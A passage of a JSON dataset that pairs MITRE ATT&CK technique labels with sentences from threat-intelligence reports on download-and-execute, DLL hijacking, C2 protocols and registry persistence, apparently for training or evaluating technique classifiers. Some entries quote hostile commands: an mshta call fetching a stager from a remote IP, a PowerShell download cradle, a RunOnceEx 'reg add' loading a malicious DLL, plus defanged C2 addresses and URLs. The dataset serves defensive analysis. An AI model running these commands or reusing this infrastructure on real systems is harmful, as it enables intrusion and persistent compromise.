    "attachedTemplate.dotm xxx 11/15/18 05:35 11/15/18 05:35 109.248.148[.]42    Table 2 Remote templates downloaded by Dear Joohn delivery documents As seen in Table 1, the delivery documents accessed their respective remote templates from four C2 servers at the following IP addresses:  185.203.118[.]198 145.249.105[.]165 188.241.58[.]170\u00a0 109.248.148[.]42  These initial C2 IP addresses not only hosted the remote templates that subsequently load the first-stage Zebrocy or Cannon payloads, but the IP addresses also hosted the C2 server for the first-stage payloads themselves",
    "The POSHSPY backdoor is designed to download and execute additional PowerShell code and Windows binaries",
    "If the user clicks on the link, he will be prompted to download a RAR file that contains the stage 1 malware/lure, which he will execute afterwards",
    "The executable attempts to download a couple of files from different sources and saves them in the AppData and Startup folders for persistence, then invokes the first downloaded file \u2013 Picture2.exe",
    "The RAT, however, had a multitude of functionalities (as listed in the table below) such as to download and execute, compress, encrypt, upload, search directories, etc",
    "The link provided in the malicious email led to a fake\u00a0VPN Web Portal:  Upon logging in with the credentials provided in the email, the victim is presented with the following page:  The victim is asked to install the \u201cVPN Client\u201d (an .exe file), or, if download fails, to download a password protected zip (with the same .exe file inside)",
    "This document was alleged to have been written by the Ministry of Reunification as demonstrated by the logo in the top left.Similar to the \"Golden Time\" campaign, this document exploits an EPS vulnerability in order to download and execute shellcode located on a compromised website:hxxp://60chicken[.]co[.]kr/wysiwyg/PEG_temp/logo1.pngThe fake image usage is a common pattern for this group",
    "The macro contains malicious code that attempts to download content from a remote server",
    "!DWN  Downloads a file from a specified URL",
    "Responds to the IRC server via PRIVMSG with \u201cDownload\u00a0 Success :FilePath=<path to downloaded file>\u201d or \u201cDownload Fail\u201d if unsuccessful",
    "The IRC variant of MPK has a command set (Table 2) that makes this an effective backdoor Trojan, specifically allowing the actors to steal credentials from the targeted system via keylogging, to navigate and interact with the file system, to run arbitrary commands, and to download and execute additional tools on the system",
    "It exploits CVE-2017-0199 to download the second stage payload from 193.23.181.151 (Figure 3)",
    "Figure 4: Downloading second stage Seminar.rtf The downloaded Seminar.rtf contains an embedded binary file that is dropped in %temp% via Equation Editor executable",
    "Zyklon is a publicly available, full-featured backdoor capable of keylogging, password harvesting, downloading and executing additional plugins, conducting distributed denial-of-service (DDoS) attacks, and self-updating and self-removal",
    "The DOC file contains an embedded OLE Object that, upon execution, triggers the download of an additional DOC file from the stored URL (seen in Figure 3)",
    "Upon opening the malicious DOC attachment, an additional download is triggered from a stored URL within an embedded OLE Object (seen in Figure 4)",
    "Figure 4: Embedded URL in OLE object    Figure 5: HTTP GET request to download the next level payload The downloaded file, doc.doc, is XML-based and contains a PowerShell command (shown in Figure 6) that subsequently downloads the binary Pause.ps1",
    "Figure 8 shows the network communication of the Pause.ps1 download",
    "Figure 8: Network communication to download the Pause.ps1 payload Zyklon Delivery In all these techniques, the same domain is used to download the next level payload (Pause.ps1), which is another PowerShell script that is Base64 encoded (as seen in Figure 8)",
    "I download my tools from GitHub, and so do my victims",
    "The \u201cupload\u201d command downloads files from the CnC and saves them locally in \u201cC:\\ProgramData\u201c",
    "Additional information In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers\u2019 arsenal but also some OPSEC mistakes made by the attackers",
    "It will:  Download and execute the backdoor component Replace the content of the downloader Mach-O executable with a decoy, either using a base64-encoded embedded file or by downloading it from the internet Open a decoy document (described later) Close the Terminal window that just opened  The decoy document replaces the downloader Mach-O file, which means the malicious executable is only present in the ZIP file now",
    "This file issued a GET request to download a malicious file from: hxxp://94.23.172.164/dupdatechecker.doc",
    "As shown in Figure 12, the script within the dupatechecker.doc file attempts to download another file named dupatechecker.exe from the same server",
    "Anyconnect[.]stream Bigip[.]stream Fortiweb[.]download Kaspersky[.]science microtik[.]stream owa365[.]bid symanteclive[.]download windowsdefender[.]win  The listed C2 servers all resolved to IPs belonging to a service provider in China at 1.2.9.0/24, which is the IP address used by the C2 server to send a cancel communications message to the end system",
    "The .iqy files take advantage of Excel\u2019s willingness to download and include the contents from a remote server in a spreadsheet",
    "2 Downloads a file to the system",
    "Once the victim downloads and executes the email attachment, it runs silently with no additional decoy documents or decoy dialog boxes",
    "This includes, but is not limited to, the following:  AES encryption of network communication File management Functionality to download, upload, and execute files Keylogging Remote desktop access Remote webcam viewing Reverse proxy Browser and FTP client password recovery  The images below are what a target user opening a malicious RTF document would see from within Microsoft Word",
    "13 Copy file to adbFle.tmp, and upload it to the C2",
    "When opened and then executed, the key components of the HTA file downloads and executes further malware from a remote URLand loads a decoy image hosted externally (Figure 3)",
    "Both responses instruct the malware to download and load a remote plugin",
    "During a file analysis of PLAINTEE in WildFire, we observed the attackers download and execute a plugin during the runtime for that sample",
    "Most of them manipulate the machine to download and execute different files",
    "Use of PowerShell to download additional tools",
    "The purpose is to download and execute an additional payload hosted on a compromised website: NavRAT",
    "NavRAT is able to download and execute files located in the attachment of a received email",
    "The shellcode of the embedded object is designed to download an image, which is, in fact, a new shellcode used to decode an embedded executable",
    "Figure 2 SYSCON network traffic witnessed during execution \u00a0 Pivoting on the domain hosting the SYSCON sample, 881.000webhostapp[.]com, revealed a number of additional samples, including a sample of the KONNI malware family, and four 64-bit executable files belonging to the CARROTBAT malware family",
    "CARROTBAT itself is a dropper that allows an attacker to drop and open an embedded decoy file, followed by the execution of a command that will download and run a payload on the targeted machine",
    "Delivery document The delivery document contains a macro that downloads an executable from a remote server",
    "Command_Down_exec: This command downloads and executes new modules.\u00a0 It takes a url as the argument and uses that to download and execute files",
    "Its presence on a compromised system allows a threat actor to spawn a reverse shell, upload or download files, and capture keystrokes",
    "After reestablishing access, the adversaries download tools such as gsecudmp and WCE that are staged temporarily on websites that TG-3390 previously compromised but never used",
    "The OwaAuth web shell enables a threat actor to upload and download files, launch processes, and execute SQL queries",
    "The script self-scheduling, as well as the scheduling of a script that repeatedly attempts to download and execute the Revenge RAT binary, significantly contribute to the persistence of this infection",
    "A backdoor that communicates with a single command and control (C2) server using HTTP GET and POST requests, TONEDEAF supports collecting system information, uploading and downloading of files, and arbitrary shell command execution.",
    "We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.",
    "",
    "certutil is a WIndows component that can download external content to the computer. In a typical attack, the criminals follow this paradigm",
    "The SQLRat script is designed to make a direct SQL connection to a Microsoft database controlled by the attackers and execute the contents of various tables",
    "The backdoor has the capability to download and upload files, execute shell commands, and update its configuration.",
    "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016)\n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)"
  ],
  "system information discovery standard application layer protocol-multi": {
    "technique_names": [
      "system information discovery",
      "application layer protocol"
    ],
    "sentances": [
      "It communicates encoded system information to a single hard coded command and control (C2) server, using the system\u2019s default User-Agent string"
    ]
  },
  "hijack execution flow: dll search order hijacking": [
    "BUGJUICE is a backdoor that is executed by launching a benign file and then hijacking the search order to load a malicious dll into it",
    "This most likely means there is some type of DLL hijacking going on by distributing a legitimate McAfee binary with MirageFox to load up the DLL properly into a legitimate looking process",
    "Whitefly has consistently used a technique known as search order hijacking to run Vcrodat.",
    "Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it.",
    "Nibatad is also a loader that leverages search order hijacking, and downloads an encrypted payload to the infected computer.",
    "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace."
  ],
  "application layer protocol": [
    "BUGJUICE defaults to TCP using a custom binary protocol to communicate with the C2, but can also use HTTP and HTTPs if directed by the C2",
    "SNUGRIDE is a backdoor that communicates with its C2 server through HTTP requests",
    "We mentioned earlier that due to the nature of the IE injection technique used by the HTTP-based backdoors, a number of C2 commands were cached to disk",
    "And, according to the collected config files, the group upgraded their malware communications\u00a0from plain text http to encrypted https in\u00a0October 2013",
    "Figure 1: Configuration file that adds new C2 server and forces the data-stealing backdoor to use it   Figure 2: Configuration file that adds TCP tunnels and records desktop video Command and Control CARBANAK communicates to its C2 servers via pseudo-HTTP or a custom binary protocol",
    "Pseudo-HTTP Protocol Messages for the pseudo-HTTP protocol are delimited with the \u2018|\u2019 character",
    "We recently mentioned this tool in another report on April 16, as this variant of the BONDUPDATER tool used DNS tunneling to communicate with its C2, specifically using TXT queries to receive information from the C2 server",
    "Server Command and control server that communicates via DNS tunneling   Panel Graphical User Interface that allows actors to issue commands, upload and download files to Agents via the Server    Table 2",
    "The Poison Frog server handles both the HTTP and DNS tunneling channels used by the hUpdater.ps1 and dUpdater.ps1 scripts",
    "Its C2 is based on IIS using .asp technology to handle the victims\u2019 HTTP requests",
    "The example C2s used by older variants of Comnie demonstrates this:  Figure 9 Old Comnie variants collecting C2 information Please refer to the Appendix for a script that may be used to decode C2 information from the older Comnie variants",
    "After Comnie collects the remote C2 information, it will communicate with these remote servers using HTTP requests",
    "The URIs used in the HTTP requests are randomly generated",
    "Table 2 Sandbox evasion checks in the C# variant of RogueRobin Like the original version, the C# variant of RogueRobin uses DNS tunneling to communicate with its C2 server using a variety of different DNS query types",
    "Figure 2 Code that issues DNS query to gogle.co if a debugger is detected All DNS requests issued by RogueRobin use the built in nslookup.exe application to communicate to the C2 server and the Trojan will use a variety of regular expressions to extract data from the DNS response",
    "Character  Digit   h 0   i 1   j 2   k 3   l 4   m 5   n 6   o 7   p 8   q 9    Table 4 Character substitution used in RogueRobin The Trojan will use future DNS requests to retrieve jobs from the C2 server, which the Trojan will handle as commands",
    "The x_mode command is disabled by default, but when enabled via a command received from the DNS tunneling channel, it allows RogueRobin to receive a unique identifier and to get jobs by using Google Drive API requests",
    "Background From October 2012 to May 2014, FireEye observed APT12 utilizing RIPTIDE, a proxy-aware backdoor that communicates via HTTP to a hard-coded command and control (C2) server",
    "If you compare the HTTP GET request from the RIPTIDE samples (Figure 1) to the HTTP GET request from the HIGHTIDE samples (Figure 3) you can see the malware author changed the following items:  User Agent Format and structure of the HTTP Uniform Resource Identifier (URI)   Figure 3: HIGHTIDE GET Request Example Similar to RIPTIDE campaigns, APT12 infects target systems with HIGHTIDE using a Microsoft Word (.doc) document that exploits CVE-2012-0158",
    "Similar to RIPTIDE and HIGHTIDE, the WATERSPOUT backdoor is an HTTP-based backdoor that communicates with its C2 server",
    "11/1/18 sahro.bella7 trala.cosh2 Bishtr.cam47 Lobrek.chizh Cervot.woprov    Table 5 Gathered C# Cannon samples As mentioned in our initial blog, the actor controlled email address acting as the C2 was sahro.bella7[at]post.cz, but all previous samples of Cannon used sym777.g[at]post.cz",
    "Even though Delphi Cannon uses POP3S and SMTPS for its C2 communications like Cannon, it is arguably easier to defend against as it uses an actor owned domain that defenders can easily block and not a legitimate email provider such as Seznam",
    "The screenshot in Figure 8 of the inf method within a Cannon sample (SHA256: 4405cfbf28\u2026) shows the information gathered that is exfiltrated to the C2 via email, specifically with RunningPlace and LogicalDrives header strings:  Figure 8 inf method used by Cannon When comparing the two Cannon variants, we found a method within a Delphi Cannon sample (SHA256: 5a02d4e5f6\u2026) showing the use of Running place and Logical_Drivers as header strings to the system information it is collecting and sending to the C2 via email",
    "The shellcode retrieves an additional payload by connecting to the following C2 server using DNS: aaa.stage.14919005.www1.proslr3[.]com Once a successful reply is received from the command and control (C2) server, the PowerShell script executes the embedded Cobalt Strike shellcode",
    "Later variants upload the file to a web server via an HTTP post command",
    "Retriever uses .NET web services and the SoapHttpClientProtocol class to communicate with its C2 server, which generates HTTP requests resembling the example request in Figure 4",
    "The shellcode executed by this command is the same as in the delivery documents as well, specifically taken from Metasploit to obtain additional shellcode to execute using an HTTP request to the following URL: http://www7.chrome-up[.]date/0m5EE We are unsure of the shellcode hosted at this URL, as we were unable to coerce the C2 server to provide a payload",
    "Once these variables are set, the malware uses the SoapHttpClientProtocol class to communicate with its C2 server, which issues an HTTP POST requests that appears as:  As you can see from the above request, the SoapHttpClientProtocol class neatly structures data into an HTTP POST request",
    "All subsequent interaction with the C2 server uses the same SOAP web service, so we will not show all of the generated HTTP requests",
    "Figure 9: Command logs after execution Network Communications FELIXROOT communicates with its C2 via HTTP and HTTPS POST protocols",
    "Table 3: FELIXROOT backdoor parameters  Cryptography All data is transferred to C2 servers using AES encryption and the IbindCtx COM interface using HTTP or HTTPS protocol",
    "Previous related research: https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html?m=1 https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/ https://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-government_entity/ https://www.sekoia.fr/blog/falling-on-muddywater/  Decoy images by country Jordan     The Hashemite Kingdom of Jordan, Ministry of Justice (mwjo.doc) DAMAMAX.doc    Turkey     Turkey\u2019s General Directorate of Security Turkey\u2019s Directorate General of Coastal Safety        Turkey\u2019s General Directorate of Security (Onemli Rapor.doc) Turkey\u2019s Ministry of the Interior (Early election.doc)    Saudi Arabia Document signed by the Major General Pilot, commander of the Saudi Royal Air Force     KSA King Saud University (KSU) KSA King Saud University (KSU)    Azerbaijan \u0130nki\u015faf \u00fc\u00e7\u00fcn g\u00f6r\u00fc\u015f.doc (meeting for development) Iraq     Iraqi Ministry of Foreign Affairs Government of Iraq, the Treasury of the Council of Ministers    Pakistan     ECP.doc National Assembly of Pakistan.doc        P.Police.doc     Afghanistan President.doc, E-government of Afghanistan Technical details Below is a description of the malware extraction and execution flow, starting from the initial infection vector, running VBA code via a macro and then dropping the PowerShell code that establishes command-center communications, sends victim system information and then receives commands supported by the malware",
    "http://www.cankayasrc[.]com/style/js/main.php http://ektamservis[.]com/includes/main.php http://gtme[.]ae/font-awesome/css/main.php  Recommendations for organizations Effective protection from targeted attacks focuses on advanced detective, preventive and investigative capabilities via solutions and training, allowing an organization to control any activities on their network or suspicious files on user systems",
    "This information can then be transmitted to the attacker using protocols such as FTP, HTTP, and SMTP",
    "tfvn[.]com[.]vnshirkeswitch[.]netguideofgeorgia[.]orggulfclouds[.]sitejhssourcingltd[.]comkamagra4uk[.]compioneerfitting[.]compositronicsindia[.]comscseguros[.]ptspldernet[.]comtoshioco[.]comwww[.]happytohelpyou[.]inIP addressesThe following IP addresses have been observed to be associated with malware campaigns.112.213.89[.]4067.23.254[.]6162.212.33[.]98153.92.5[.]124185.117.22[.]19723.94.188[.]24667.23.254[.]17072.52.150[.]218148.66.136[.]62107.180.24[.]253108.179.246[.]13818.221.35[.]21494.46.15[.]20066.23.237[.]18672.52.150[.]218URLs:The following URLs have been observed to be associated with malware campaigns.https[:]//a[.]pomf[.]cat/http[:]//pomf[.]cat/upload[.]php",
    "The initial DNS query sent by the payload to obtain the system specific identifier uses the following structure, which includes the current process identifier (PID) as the subdomain of the C2 domain: <current process id>.<c2 domain> The C2 server will provide the system specific identifier within the answer portion of the DNS response",
    "The following shows the specific IP addresses or strings used by the C2 to transmit a success or cancel message depending on the type of DNS query used for C2 communications:    DNS Type Successful Cancel   A,AC 1.1.1.\\d+ 1.2.9.\\d+   AAAA 2a00:: 2200::   CNAME,MX,TXT,SRV,SOA ok cancel    After providing system specific information, the payload will Interact with the C2 server to obtain commands, which the payload refers to as jobs",
    "To obtain strings to treat as commands, the payload will issue a series of DNS queries to resolve domains with the following structure: <system id>-<job ID>-<offset data specific to job>.<c2 domain> The C2 server will provide responses to these queries that contain answers in IPv4 or IPv6 addresses depending on the type of DNS query the payload uses to communicate with its C2 server",
    "This command will automatically set the DNS type to use for actual C2   $showconfig Uploads the current configuration of the payload to the C2   slpx:\\d+ Sets the sleep interval between outbound DNS requests   $fileUpload Downloads contents from the C2 server and writes them to a specified file    Table 3 Commands available to payload Campaign Analysis The following domains are configured within the payload to be used as C2s",
    "For instance, the downloader will first attempt to communicate with its C2 server using an HTTPS request",
    "If that HTTPS request is not successful, the downloader will issue an HTTP request",
    "Lastly, if the HTTP request is not successful, the downloader will fallback to using DNS tunneling to establish communications",
    "If both attempts fail and the payload is unable to obtain a session ID and pre-shared key via HTTP or HTTPS, it will try to use DNS tunneling",
    "It does so using either the HTTPS/HTTP or DNS channels, depending on which method is successful",
    "The payload will construct a message that has the following structure that it will then send to the C2: \u00a0 bye<char uuid[35]>d \u00a0 The message above is sent via a simple HTTPS/HTTP POST request to the C2 server",
    "As seen in the above request, the Trojan will generate a URL for its beacon with the following structure:http://<c2 domain>/chk?<hex(Environment.UserName/Environment.MachineName)> The Trojan will issue a request to this URL to check (hence the chk string in the URL) to see if the C2 server has a command for the Trojan to run",
    "The Trojan will then read the hexadecimal formatted contents of this file in 1500 byte blocks, sending each 1500 bytes of data from the file to the C2 server via an HTTP GET request to a URL with the following structure:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(command prompt output)> The upload command (2) writes data provided by the C2 to a specified file",
    "[1]\u00a0https://www.clearskysec.com/report-the-copykittens-are-targeting-israelis/ [2]\u00a0https://www.clearskysec.com/copykitten-jpost/",
    "After the C2 information has been collected, BADNEWS leverages HTTP for communication with the remote servers",
    "33 Download specified file to %TEMP%\\up and execute it in a new process    \u00a0 During C2 communications, BADNEWS will communicate to the C2 previously identified via HTTP",
    "Exfiltrate data using HTTP over HTTP over AES over XOR, or any combination of the available transports",
    "Deep Discovery Inspector protects customers from these threats via this DDI Rule:  DDI Rule 18 : DNS response of a queried malware Command and Control domain DDI Rule 15 : Many unsuccessful logon attempts (nbt_scan.exe) DDI Rule 38 : Multiple unsuccessful logon attempts (nbt_scan.exe)  TippingPoint customers are protected from these threats via these ThreatDV filters:  27218: HTTP: TROJ_RATANKBA_A Checkin 28219: HTTP: TROJ_RATANKBA_A Checkin 02 27220: HTTPS: TROJ_RATANKBA_A Checkin 27221: HTTP: Sundown EK Flash Exploit (SWF_EXPLOYT.YYRQ)  A list of related Indicators of Compromise (IoCs) can be found in this appendix",
    "IcedCoffee is a fairly basic backdoor which uses WMI to collect a variety of system and user information from the system, which is then encoded with base64, encrypted with RC4 and submitted via HTTP POST to the C2 server",
    "It then calls the subfunction with the argument of 2 to get the string that it will use as the HTTP POST request",
    "The resulting HTTP POST request looks like the following: POST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1 Host: 185.25.50[.]93 Content-Type: application/x-www-form-urlencoded Content-Length: 21 porg=44908AE0524f422d We have not seen a C2 server respond to our requests during our analysis, however, we do know how the Trojan will parse the C2\u2019s response for specific data",
    "We have seen the following HTTP POST parameters within the Zebrocy C++ samples: porg structOne oq volume DDE Details The author of the DDE document used in the February 2018 attacks used some obfuscation techniques in an attempt to evade detection",
    "Victim Registration SpeakUp uses POST and GET requests over HTTP to communicate with its main C&C which is the compromised website of speakupomaha[.]com",
    "It uses the legitimate Naver email platform in order to communicate with the attackers via email",
    "Command & Control  The malware communicates with the Naver email platform in order to communicate with the operator",
    "It communicates with ftp.bytehost31[.]org via FTP for command and control (C2)",
    "Domains  http://mdzz2019.noip[.]cn:19931 http://mdzz2019.noip[.]cn:3654/  From my analyses, I was able to identify http://mdzz2019.noip[.]cn:19931 as its main C2 url.\u00a0 This is a dynamic DNS, meaning the actual IP changes quite frequently",
    "XAgent uses HTTP requests to communicate with its C2 servers, which allows the threat actor to interact with the compromised system",
    "The Trojan uses HTTP POST requests, as seen in Figure 1 to send data to the C2 server, and GET requests to receive commands from the server, as seen in Figure 2",
    "Figure 1 XAgent macOS HTTP POST request  Figure 2 XAgent mscOS HTTP GET request The C2 URLs generated by XAgentOSX are very similar to those created by its Windows-based counterpart",
    "Figure 3 Hardware ID used by XAgent to uniquely identify compromised hosts When generating the URLs within the HTTP POST and GET requests, XAgent sets one HTTP parameter using a specific data structure that contains this agent_id value",
    "For instance, when using this string we observed DNS queries for \u201capple-search.infoclose\u201d, as the string \u201cclose\u201d was supposed to be the next portion of the C2 URL",
    "",
    "it operates over DNS traffic, but can also switch to encrypted channels such as HTTPS or SSL",
    "HAWKBALL is a backdoor that communicates to a single hard-coded C2 server using HTTP",
    "The malware sends an HTTP GET request to its C2 IP address using HTTP over port 443",
    "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. "
  ],
  "screen capture file and directory discovery-multi": {
    "technique_names": ["screen capture", "file and directory discovery"],
    "sentances": [
      "It has the capability to find files, enumerate drives, exfiltrate data, take screenshots and provide a reverse shell"
    ]
  },
  "boot or logon autostart execution: registry run keys / startup folder": [
    "Persistence is maintained through a Run registry key",
    "In the order to run the SSH server, the attackers created a VBS file with the following content: Set WshShell = CreateObject(\u201cWScript.Shell\u201d) WshShell.CurrentDirectory = \u201cC:\\WINDOWS\\TEMP\\Dropbear\\\u201d WshShell.Run \u201cdropbear.exe -r rsa -d dss -a -p 6789\u201d, 0, false As is evident here, the SSH server will accept connections on port number 6789",
    "This marker indicates the presence of an encrypted MZ marker in the .hwp file and is decrypted by the malware and written to the Startup folder for the user:  C:\\Documents and Settings\\<username>\\Start Menu\\Programs\\Startup\\viso.exe  This step establishes the persistence of the malware across reboots on the endpoint Once the decrypted MZ marker is written to the Startup folder, the 2.hwp is deleted from the endpoint  The malware might perform this activity for a couple of reasons:  Establish persistence for itself on the endpoint Establish persistence of another component of the malware on the endpoint Update itself on endpoint after a separate updater component downloads the update from the control server  The malware has limited reconnaissance and data-gathering capabilities and is not full-fledged spyware",
    "Finally, the first DLL adds the registry key \u201cSysRat,\u201d at SoftWare\\Microsoft\\Windows\\CurrentVersion\\Run, to ensure the malware is executed at startup",
    "The two variants of MPK share the same registry key that the Trojan uses to automatically run each time the system starts, specifically: [HKLM and HKCU]\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\explorer Both MPK variants include key loggers that are extremely similar in functionality in addition to having the same strings used for headers within the key log file",
    "The RunAtLoad key will command launchd to run the daemon when the operating system starts up, while the KeepAlive key will command launchd to let the process run indefinitely",
    "The embedded VBScript is retrieved from a resource and decrypted using the same algorithm as discussed above, which results in the following cleartext:       set objshell = createobject(\\\"wscript.shell\\\")objshell.run \\\"mshta hxxp://86.106.131.177:6500/zIZFh\\\",vbhide     The Koadic C2 server will respond to this request with Javascript code that acts as the Koadic staging payload, which allows the actor to run additional Koadic modules on the end system to carry out their post-exploitation activities",
    "NavRAT then creates a registry key in order to execute this file copy at the next reboot of the system, an initial method of persistence",
    "Once the user clicks on the fake Adobe Flash Player installer, it will extract/create the following malicious payload into the Startup directory to maintain its persistence:",
    "Register the RUN key in the registry below, so that the VBS file is executed every time the machine starts",
    "A new registry entry is created at HKEY_CURRENT_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Graphics with a value of \u201cC:\\ ProgramData \\ Initech \\Initech.exe\u201d /run.",
    "When each file is encrypted, registry keys are created under HKU\\{SID}\\Software\\Microsoft\\ RestartManager \\ which are used to track metadata pertaining to the file being encrypted, such as owner, sequence, session and file hash",
    "",
    "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs."
  ],
  "boot or logon autostart execution: shortcut modification": [
    "APT10 spear phishes have been relatively unsophisticated, leveraging .lnk files within archives, files with double extensions (e.g",
    "The .lnk file extracted from the .7zip file",
    "When the .lnk file is initialized, it spawns a CMD process",
